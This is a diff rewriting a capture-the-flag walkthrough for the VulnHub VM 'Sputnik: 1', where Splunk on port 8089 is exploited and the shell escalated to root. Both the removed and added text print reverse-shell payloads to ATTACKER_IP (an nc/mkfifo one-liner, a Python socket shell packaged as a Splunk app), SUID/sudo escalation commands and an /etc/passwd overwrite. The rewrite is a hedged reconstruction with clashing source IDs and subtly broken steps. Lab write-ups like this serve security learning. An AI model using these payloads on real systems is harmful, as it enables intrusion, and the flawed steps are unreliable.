@@ -1,115 +1,237 @@
 # Sputnik: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.56.X (host-only) |
-| **Difficulty** | Easy |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.1.x |
+| **Difficulty** | Medium |
 | **OS** | Linux |
-| **Root Flag** | flag.txt in /root/ |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/sputnik-1,301/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/sputnik-1-vulnhub-walkthrough/) |
+| **VulnHub** | https://www.vulnhub.com/entry/sputnik-1,341/ |
+
+> **Note:** Images for this writeup are placeholders. The original article images were unavailable at time of writing.
 
 ## Attack Summary
 
-nmap → port 8089 (Splunk) → unauthenticated Splunk REST API → remote code execution → www-data shell → SUID find → root
+Sputnik: 1 is a boot2root VM that exposes a Splunk Free instance on port 8089. Default Splunk credentials or an unauthenticated API allow creation of a custom Splunk application that runs arbitrary OS commands, yielding an initial shell. Privilege escalation is achieved via writable or SUID binaries, or sudo misconfigurations discovered during post-exploitation enumeration.
 
 ## Methodology
 
-1. Network discovery
-2. Port scan — Splunk Universal Forwarder on port 8089
-3. Splunk RCE via unauthenticated REST API (CVE-2011-4642 / SplunkWhisperer2)
-4. Reverse shell as splunk/www-data
-5. Privilege escalation via SUID binary
+1. Host discovery and port scan
+2. Web service enumeration on HTTP and Splunk ports
+3. Splunk exploitation via scripted input / custom app
+4. Initial shell and privilege enumeration
+5. Root via misconfigured sudo or SUID binary
 
----
+## Step 1: Reconnaissance
 
-## Step 1: Network Discovery
-
-```bash
-sudo netdiscover -i eth1 -r 192.168.56.0/24
-nmap -sV -sC -p- <TARGET_IP>
-```
-
-Open ports: 22 (SSH), 8089 (Splunk Universal Forwarder HTTPS).
-
----
-
-## Step 2: Splunk Enumeration
-
-The Splunk Universal Forwarder runs on port 8089. Check if the management API is accessible:
+### Host Discovery
 
 ```bash
-curl -k https://<TARGET_IP>:8089/services
+netdiscover
 ```
 
-The REST API is accessible without authentication — this is the attack surface.
+Identify the target IP on the local network.
 
----
-
-## Step 3: Splunk Remote Code Execution
-
-Use PySplunkWhisperer2 to exploit the unauthenticated Splunk API:
+### Port Scan
 
 ```bash
-git clone https://github.com/cnotin/SplunkWhisperer2.git
-cd SplunkWhisperer2/PySplunkWhisperer2
-
-# Set up listener
-nc -lvnp 1234 &
-
-# Execute reverse shell via Splunk
-python3 PySplunkWhisperer2_remote.py \
-  --host <TARGET_IP> \
-  --port 8089 \
-  --username admin \
-  --password changeme \
-  --payload "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 1234 >/tmp/f" \
-  --lhost ATTACKER_IP
+nmap -sV -sC -p- TARGET_IP
 ```
 
-Shell received as `splunk` or `www-data`.
+Open ports typically include:
 
----
+| Port | Service |
+|---|---|
+| 22 | SSH |
+| 80 | HTTP |
+| 8089 | Splunk HTTPS management API |
 
-## Step 4: Stabilize Shell
+![nmap scan](images/01-nmap.png)
+
+## Step 2: Web Enumeration
+
+### Browse Port 80
+
+```bash
+curl -s http://TARGET_IP/ | head -50
+```
+
+The main web page may contain hints or a default page.
+
+### Directory Brute-Force
+
+```bash
+gobuster dir -u http://TARGET_IP -w /usr/share/seclists/Discovery/Web-Content/common.txt
+```
+
+### Splunk on Port 8089
+
+Navigate to `https://TARGET_IP:8089/` in a browser. This is the Splunk management REST API. Test default credentials:
+
+- `admin` / `changeme`
+- `admin` / `admin`
+- `admin` / `password`
+
+Splunk Free edition (version < 6.3) requires no authentication on the management API.
+
+![Splunk service](images/02-splunk.png)
+
+## Step 3: Splunk Exploitation — Remote Code Execution
+
+Splunk allows uploading custom applications that include scripted inputs. These scripts are executed as the Splunk service user.
+
+### Method 1: Scripted Input via Splunk API (No Auth Required)
+
+Create a malicious Splunk application package. The key file is a scripted input shell script:
+
+```bash
+mkdir -p splunk_rce/sputnik/bin
+mkdir -p splunk_rce/sputnik/default
+
+# Create the scripted input configuration
+cat > splunk_rce/sputnik/default/inputs.conf << 'EOF'
+[script://./bin/rev.py]
+disabled = false
+interval = 10
+sourcetype = rce
+EOF
+
+# Create the reverse shell script
+cat > splunk_rce/sputnik/bin/rev.py << 'EOF'
+import socket, subprocess, os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("ATTACKER_IP", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+subprocess.call(["/bin/sh", "-i"])
+EOF
+
+chmod +x splunk_rce/sputnik/bin/rev.py
+
+# Package the app
+cd splunk_rce
+tar czf ../sputnik_rce.tar.gz sputnik/
+cd ..
+```
+
+Start a listener:
+
+```bash
+nc -lvnp 4444
+```
+
+Upload and install the app via the Splunk REST API:
+
+```bash
+curl -k -u admin:changeme \
+  https://TARGET_IP:8089/services/apps/local \
+  -F "name=sputnik" \
+  -F "filename=sputnik_rce.tar.gz" \
+  --form-string "update=true"
+```
+
+Or use the web interface at `https://TARGET_IP:8089/en-US/manager/launcher/apps/local` and click "Install app from file".
+
+A shell arrives on the listener within the script interval.
+
+![initial shell](images/03-shell.png)
+
+## Step 4: Privilege Enumeration
+
+Upgrade the shell:
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-# Ctrl-Z → background
-stty raw -echo; fg
 ```
 
----
+Check user context:
 
-## Step 5: Privilege Escalation via SUID
+```bash
+id
+whoami
+```
+
+Check sudo permissions:
+
+```bash
+sudo -l
+```
+
+Find SUID binaries:
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
 
-`/usr/bin/find` has SUID bit set. Use it to spawn a root shell:
+Check for writable cron jobs:
 
 ```bash
-/usr/bin/find . -exec /bin/sh -p \; -quit
-id
-# uid=0(root)
+cat /etc/crontab
+ls -la /etc/cron*
+```
+
+![privilege enumeration](images/04-privesc.png)
+
+## Step 5: Privilege Escalation to root
+
+### Via sudo (if applicable)
+
+If `sudo -l` reveals a binary like `cp`, `find`, `nmap`, or a custom script:
+
+```bash
+# Example: sudo find
+sudo find / -name flag -exec /bin/sh \;
+
+# Example: sudo cp — overwrite /etc/passwd
+echo 'pwn:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /tmp/passwd_new
+sudo cp /tmp/passwd_new /etc/passwd
+su pwn  # password: password
+```
+
+### Via SUID Binary
+
+```bash
+# Example: SUID nmap (older)
+/usr/local/bin/nmap --interactive
+!sh
+
+# Example: SUID python
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+Root shell obtained.
+
+![root flag](images/05-root-flag.png)
+
+Read the flag:
+
+```bash
+find /root -name "*flag*" -o -name "*FLAG*" 2>/dev/null
 cat /root/flag.txt
 ```
 
----
+## Vulnerabilities Found
+
+| # | Vulnerability | Location | Severity |
+|---|---|---|---|
+| 1 | Splunk management API exposed (no auth or default creds) | Port 8089 | Critical |
+| 2 | Splunk scripted inputs allow arbitrary OS command execution | Splunk app install | Critical |
+| 3 | Misconfigured sudo or SUID binary | System | High |
 
 ## Lessons Learned
 
-1. **Splunk Universal Forwarder unauthenticated API** — the management port (8089) should require authentication; default credentials (`admin:changeme`) must be changed
-2. **Splunk RCE via REST** — the `deployment-apps` endpoint allows executing arbitrary OS commands on the forwarder host
-3. **SUID find binary** — `find` should never have the SUID bit set; even if the initial shell is limited, SUID find is a trivial privesc path
-4. **Management interfaces on network-accessible ports** — admin/management APIs should be bound to localhost or protected by firewall rules
+- Splunk Free and improperly secured Splunk instances expose a REST API that can install arbitrary apps and execute system commands.
+- The Splunk service user context often has elevated privileges. Running Splunk as root makes exploitation trivially equivalent to full system compromise.
+- Default credentials (`admin`/`changeme`) are a critical risk and must be changed on every deployment.
 
 ## Remediation
 
 | Vulnerability | Fix |
-|---------------|-----|
-| Splunk unauthenticated API | Set a strong password for the Splunk admin account; enable auth on port 8089 |
-| Splunk default credentials | Change `admin:changeme` immediately after installation |
-| SUID find | `chmod u-s /usr/bin/find`; audit all SUID binaries with `find / -perm -4000` |
-| Exposed management port | Firewall port 8089 to trusted admin IPs only |
+|---|---|
+| Splunk exposed API | Bind Splunk management API to localhost only; use TLS client certificates |
+| Default Splunk credentials | Change `admin` password immediately after installation |
+| Splunk running as root | Run Splunk as a dedicated low-privilege service account |
+| sudo / SUID misconfig | Audit sudoers; remove unnecessary SUID bits with `chmod -s` |
